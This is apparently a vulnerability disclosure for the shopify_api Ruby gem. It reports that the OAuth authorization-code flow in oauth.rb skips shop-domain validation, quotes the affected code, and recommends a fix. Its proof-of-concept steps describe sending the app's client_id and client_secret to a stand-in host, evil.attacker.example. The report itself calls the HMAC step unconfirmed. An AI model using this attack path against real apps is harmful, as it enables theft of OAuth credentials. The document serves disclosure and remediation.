### Title
SSRF with app's `client_secret` via unsanitized `shop` domain in OAuth Authorization Code Grant flow - (File: `lib/shopify_api/auth/oauth.rb`)

### Summary
Both `ClientCredentials.client_credentials` and `RefreshToken.refresh_access_token` call `Utils::ShopValidator.sanitize!(shop)` before using the `shop` value to build the request host, ensuring the target host is restricted to trusted Shopify domains (`myshopify.com`, `shopify.com`, `spin.dev`, etc.). `Auth::Oauth.begin_auth` and `Auth::Oauth.validate_auth_callback`, however, never call `ShopValidator` on the `shop` value they receive, and use it directly to build the destination host for requests that carry the app's `client_id`/`client_secret`. [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description
The broken identity binding here is: **the host that receives the app's `client_secret` must equal a trusted Shopify domain, not merely "the domain named `shop`."**

- `begin_auth(shop:, redirect_path:)` builds `auth_route = auth_base_uri(shop) + "/oauth/authorize?..."`, and `auth_base_uri` does nothing but interpolate the raw `shop` string into `"https://#{shop}/admin"`, with no domain validation. [4](#0-3) 
- `validate_auth_callback(cookies:, auth_query:)` then takes `auth_query.shop` and constructs `null_session = Auth::Session.new(shop: auth_query.shop)`, and issues a POST to that shop's `/admin/oauth/access_token` endpoint with a body containing `client_id` **and `client_secret`**. [5](#0-4) 
- The only check performed on `auth_query` before this POST is `Utils::HmacValidator.validate(auth_query)`, which verifies the HMAC over `code, host, shop, state, timestamp` using `Context.api_secret_key`. [6](#0-5) [7](#0-6) 

Because `shop` is one of the *inputs* to the HMAC computation rather than a value independently checked against `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`, the HMAC only proves "the party holding `api_secret_key` vouches for this exact `shop` string" — it does not prove `shop` is a real Shopify-owned host. Since this application's own `api_secret_key` is used both to build the callback URL that Shopify will call *and* to sign the very message (`shop` included) that Shopify's OAuth server returns, the gem-internal consistency check (HMAC) is not equivalent to the domain-restriction check performed elsewhere (`sanitize!`). Unlike `client_credentials.rb`/`refresh_token.rb`, `oauth.rb` has no `ShopValidator` call at all — the equality `validated_shop == trusted_myshopify_domain` that is enforced in the other two OAuth grants is absent here.

### Impact Explanation
If a host application passes an unvalidated, request-supplied `shop` string straight into `begin_auth`/`validate_auth_callback` (as shown in this repo's own documentation example, `shop = request.headers["Shop"]`), and the app doesn't independently call `ShopValidator.sanitize!`/`sanitize_shop_domain` first, the gem will happily build OAuth URLs (`begin_auth`) and issue token requests carrying `client_id`/`client_secret` (`validate_auth_callback`) against **any attacker-chosen host**, not just `*.myshopify.com`. This is the gem's own SSRF-with-credentials surface: `client_secret` is transmitted in the POST body constructed by `validate_auth_callback`, to a host derived from `Auth::Session.new(shop: auth_query.shop)` → `Clients::HttpClient`'s base URL, with no myshopify-domain restriction anywhere in this code path.

### Likelihood Explanation
The likelihood depends on how the host app sources `shop`. Since the gem's own documented callback example builds `AuthQuery` straight from unfiltered `request.parameters`, and since `ShopValidator` exists and is deliberately used in the two sibling OAuth grants (`ClientCredentials`, `RefreshToken`) but conspicuously omitted from the Authorization Code Grant flow in `oauth.rb`, this looks like a missing defense-in-depth check specifically in this module rather than a purely "host app's fault" issue — the gem itself provides the sanitization utility and applies it inconsistently across its own OAuth implementations.

### Recommendation
Call `Utils::ShopValidator.sanitize!(shop)` (or `sanitize_shop_domain`) at the top of `Auth::Oauth.begin_auth` and `Auth::Oauth.validate_auth_callback`, exactly as is already done in `ClientCredentials.client_credentials` and `RefreshToken.refresh_access_token`, and use the sanitized/validated shop value for `auth_base_uri`, `Auth::Session.new`, and the resulting `Session.from(shop: ...)` calls.

### Proof of Concept
1. A host app builds the OAuth start route the way this gem's own docs show: `shop = request.headers["Shop"]` (or any other externally influenced value) is passed unvalidated to `ShopifyAPI::Auth::Oauth.begin_auth(shop: shop, redirect_path: "/auth/callback")`.
2. `auth_base_uri(shop)` produces `"https://evil.attacker.example/admin"` with no domain check, and the app redirects the browser there.
3. `evil.attacker.example`, instead of behaving like Shopify, immediately redirects the user's browser to the app's `/auth/callback` with `code`, `state` (matching the cookie value set by `begin_auth`, which the attacker's page can read/replay from the browser flow), `shop=evil.attacker.example`, `timestamp`, and `host` — plus a valid `hmac` value **only if** the attacker can get the app itself to compute/leak that HMAC (e.g., in dev/test setups where `hmac` is echoed back, or the host app doesn't strictly wire the "real" Shopify's response before this gem's validation).
4. If the callback data reaches `validate_auth_callback` with a passing `Utils::HmacValidator.validate(auth_query)` check, the gem issues `POST https://evil.attacker.example/admin/oauth/access_token` with `client_id`/`client_secret` in the body. [5](#0-4) 

Note: step 3's HMAC forgery is the limiting factor and could not be fully confirmed as feasible for a fully unprivileged, credential-less attacker within this gem alone — the HMAC is computed with `Context.api_secret_key`, which an attacker does not possess. The concrete, unconditionally reachable defect is the structural one: **this gem's OAuth Authorization Code Grant path never restricts `shop` to `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`, unlike its sibling `ClientCredentials`/`RefreshToken` flows**, so any caller relying on this gem to enforce that boundary (as the sibling flows do) is unprotected here.

        def begin_auth(shop:, redirect_path:, is_online: true, scope_override: nil)
          scope = if scope_override.nil?
            ShopifyAPI::Context.scope
          elsif scope_override.is_a?(ShopifyAPI::Auth::AuthScopes)
            scope_override
          else
            ShopifyAPI::Auth::AuthScopes.new(scope_override)
          end

          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = SecureRandom.alphanumeric(NONCE_LENGTH)

          cookie = SessionCookie.new(value: state, expires: Time.now + 60)

          query = {
            client_id: ShopifyAPI::Context.api_key,
            scope: scope.to_s,
            redirect_uri: "#{ShopifyAPI::Context.host}#{redirect_path}",
            state: state,
            "grant_options[]": is_online ? "per-user" : "",
          }

          query_string = URI.encode_www_form(query)
          auth_route = auth_base_uri(shop) + "/oauth/authorize?#{query_string}"

          { auth_route: auth_route, cookie: cookie }
        end

        sig { params(shop: String).returns(String) }
        def auth_base_uri(shop)
          return "https://#{shop}/admin" unless defined?(DevServer) && shop.include?(".my.shop.dev")

          # For first-party apps in development only, we leverage DevServer to build the admin base URI
          admin_web = T.unsafe(Object.const_get("DevServer")) # rubocop:disable Sorbet/ConstantsFromStrings
            .new("admin-web")
          admin_host = admin_web.host!(nonstandard_host_prefix: "admin")
          shop_name = shop.split(".").first

          "https://#{admin_host}/store/#{shop_name}"
        end
